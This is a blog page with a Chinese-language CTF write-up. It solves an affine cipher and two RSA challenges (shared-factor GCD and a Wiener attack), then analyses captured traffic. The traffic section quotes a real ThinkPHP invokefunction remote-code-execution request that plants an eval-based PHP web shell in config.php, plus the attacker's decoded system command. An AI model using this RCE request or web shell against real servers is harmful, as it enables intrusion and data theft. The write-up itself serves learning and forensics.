<p><img src="https://i.loli.net/2021/10/06/W4gTGpZsIqk2odc.png" alt="image.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EZ-Crypto"><a href="#EZ-Crypto" class="headerlink" title="EZ Crypto"></a>EZ Crypto</h3><p>ä»¿å°„å¯†ç </p>
<p>ç›´æ¥ä¸Šè„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">    gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    gcd, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># modular inverse does not exist</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    C = (a*P + b) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>]) % <span class="number">26</span>)</span><br><span class="line">                        + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    P = (a^-1 * (C - b)) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((modinv(key[<span class="number">0</span>], <span class="number">26</span>)*(<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - key[<span class="number">1</span>]))</span><br><span class="line">                         % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = [<span class="number">17</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;EKZZJKZZYUBBAHK&quot;</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;decrypt(c, key)&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>flag&#123;WELLHELLOAFFINE&#125;</code></p>
<h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><p>CtfRsaTool ä¸€æŠŠæ¢­ <code>comfact_cn</code>å¯å‡º</p>
<p>ç”±äº m ä¸­åŒ…å«äº† p é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ æ±‚ c ä¸ n çš„æœ€å¤§å…¬çº¦æ•°æ±‚å‡º q</p>
<p>åé¢æŒ‰ç…§æ ‡å‡†æµç¨‹è§£å¯†å°±å¥½äº†</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">13099786225848114426288735042622063709429417979653559902255130110659975926568234663676756524835204106945448519122951053919052978834452790083656081239724399724465813907281626036733220108031627090004400217055377991780064228481074731242267303495888888602962900043528353166689119375820829095012486469286192640858709120034967539197423507664888963829638473265043059180698438334763097949285344221617697610851153154943002108316864408271636493080517356530114745146546897588878707507824683476104289624176537904920121831095000551916845112223416432133409395056783383953717096046196532887274225485656111146665584317804803318338909</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">8559655499265896361118223899353477299042241757209602984255991793623671902400849937041183417595204298397177450326134011299326668532961582184674623363025538600270072707047163533208789053017456849333485228029982885219677656015050632558654985633574879301710404077674861745881754178023445783080693280818480184811356779954303543761230708350552871210348291625654157493398915163250634555513484314769991628473845225469274037082850635228850870120629706273968570480643866051827420679768935556198892958086984241175115383476535497399981543828236629739929537486115788597861436866044189520462578886229791185703549894677979975800817</span></span><br><span class="line"></span><br><span class="line">p = GCD(n, c)</span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">m = M // <span class="number">114514</span> // p</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>flag&#123;f299e536-71df-2a9c-4189-1541f4724e2b&#125;</code></p>
<h3 id="æˆ‘å¤§Eäº†"><a href="#æˆ‘å¤§Eäº†" class="headerlink" title="æˆ‘å¤§Eäº†"></a>æˆ‘å¤§Eäº†</h3><p>è¿™é‡Œçœ‹åˆ°çš„ e éå¸¸å¤§ï¼Œå¯ä»¥ä½¿ç”¨ <code>wiener</code>æ±‚d <a target="_blank" rel="noopener" href="https://github.com/orisano/owienerï¼Œæœ‰äº†d">https://github.com/orisano/owienerï¼Œæœ‰äº†d</a>, n e2æˆ‘ä»¬å°±èƒ½æ±‚å‡º p, q å†å¾€åå°±èƒ½å¯ä»¥æ ¹æ® RSA çš„æ ‡å‡†æµç¨‹å¤„ç†è§£å¯†äº†</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes, GCD</span><br><span class="line"><span class="keyword">import</span> wiener</span><br><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/orisano/owiener</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x10001</span></span><br><span class="line">e2 = <span class="number">30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599</span></span><br><span class="line">n = <span class="number">109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span></span><br><span class="line">c1 = <span class="number">71583783682021619717999479268651786751161610363987881699058479972417097127681864247477848165312443269552261650281395262160728715862254920244393628296570316218768130014057719355479608374320909554953446063226545440801131248900137089609895608341522946793200814556574254250659621793341199431483521650853287065268462347854129303033847182723629092195909957117089056444411650802573134427914604925772044236086815457154819679424034812539639758661460317397185002960311032637913793371456665287379240275667317336526891584182621458450580573412613408361770289740079739848770272206592041842234862740865747628519852066267368160881640</span></span><br><span class="line">c2 = <span class="number">55494113780323304422454443648470010911900254740052633133363579960778021288760719271727939446265317907324037593785145992975447677054351886369334354944686849950347151902030735393458784973074467509096895699845403768218581207266475016330668907743203265620833738555574220981953741412558878717721926421279776436821288860990364711094386574370156520178658536435862325596193413858200565399019959529641748661306266278353593276972984410712399939855516008418931398046437081154108451462740956025357863828658378552113064369320441912407668462443383302645820142910970079821181611519951712237177739140891042508920500678667417508093499</span></span><br><span class="line"></span><br><span class="line">d2 = wiener.attack(e2, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/ius/rsatool/blob/master/rsatool.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span>(<span class="params">n, d, e</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        quotient, remainder = <span class="built_in">divmod</span>(t, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i-<span class="number">1</span>, n) * t, n)</span><br><span class="line">            c2 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"></span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (-<span class="number">1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># p = fractions.gcd(c1-1, n)</span></span><br><span class="line">    p = GCD(c1-<span class="number">1</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = factor_modulus(n, d2, e2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = inverse(e1, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1, d1, n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;14c78aaf-9221-1899-3a7f-0f287f3f6790&#125;</code></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="EZ-Traffic"><a href="#EZ-Traffic" class="headerlink" title="EZ Traffic"></a>EZ Traffic</h3><p>æµé‡å®¡è®¡</p>
<p><img src="https://i.loli.net/2021/10/06/R64rmEy1WZbNAes.png" alt="image.png"></p>
<p>å…ˆçœ‹ä¸‹ç»Ÿè®¡ HTTP åå¤š, é‚£å°±çœ‹çœ‹ HTTP æœåŠ¡</p>
<p>çœ‹ä¸‹ HTTP</p>
<p><img src="https://i.loli.net/2021/10/06/foxFKILSE5WJTZN.png" alt="image.png"></p>
<p>è¿™å‡ ä¸ª traffic è›®å¯ç–‘çš„</p>
<p><img src="https://i.loli.net/2021/10/06/TirEoF2bjepLSB5.png" alt="image.png"></p>
<p>è¿˜æœ‰ä¸€ä¸ª <code>flag.zip</code></p>
<p>æˆ‘ä»¬ä¸å¦¨å…ˆæŠŠè¿™ä¸ªæ–‡ä»¶è§£å‡ºæ¥ å‘ç°æœ‰å¯†ç  å°±ç»§ç»­å¾€ä¸Šçœ‹</p>
<p><code>config.php?cmd=xxxx</code>æ¯”è¾ƒå¯ç–‘ base64 è§£ç åçœ‹ä¸åˆ°å†…å®¹ é‚£å°±ç»§ç»­å¾€ä¸Šçœ‹</p>
<blockquote>
<p>GET /?s=index%7Cthink%5Capp%2Finvokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=file_put_contents&amp;vars%5B1%5D%5B0%5D=config.php&amp;vars%5B1%5D%5B1%5D=%3C%3Fphp+eval%28gzinflate%28base64_decode%28%24_REQUEST%5B%22cmd%22%5D%29%29%29%3B+%3F%3E HTTP/1.1<br>Host: 47.100.41.68<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Connection: keep-alive</p>
</blockquote>
<p>å‘ç°è¿™é‡Œå†™äº†ä¸€ä¸ª <code>config.php</code> çš„é©¬ å†…å®¹ä¸º <code>&lt;?php eval(gzinflate(base64_decode($_REQUEST[&#39;cmd&#39;])));</code></p>
<p>æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª gzinflate</p>
<p>ä¸‹é¢çœ‹ response éƒ¨åˆ† å‘ç° åŒ… 3214 æœ‰è¿”å› zip çš„ç»“æœ æˆ‘ä»¬ç»™ä»–çš„ request è§£å¯†</p>
<p><code>echo system(&quot;zip --password K5bi8UgMNGC97QhPHgpRrrWtYZYkoe7C flag.zip /flag&quot;);</code></p>
<p>è§£å‹å¾— flag</p>
<p><img src="https://i.loli.net/2021/10/06/osuF7vlwx3UMLjI.png" alt="image.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/11/UJNCTFæ ¡èµ›wp/">http://example.com/2021/10/11/UJNCTFæ ¡èµ›wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://example.com">Alex's blog~</a>ï¼</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/reverse/">reverse</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/misc/">misc</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/10/26/%E5%A4%87%E8%B5%9B%E9%80%89%E6%8B%A9%E9%A2%98%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/"><i class="fa fa-chevron-left">  </i><span>å¤‡èµ›é€‰æ‹©é¢˜å¤§èµ›å†³èµ›ä¹‹è¢«è¿«æˆä¸ºwebæ‰‹</span></a></div><div class="next-post pull-right"><a href="/2021/09/25/DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"><span>DASCTF-Sept-X-æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›wp</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2024 By Alex</div><div class="framework-info"><span>é©±åŠ¨ - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>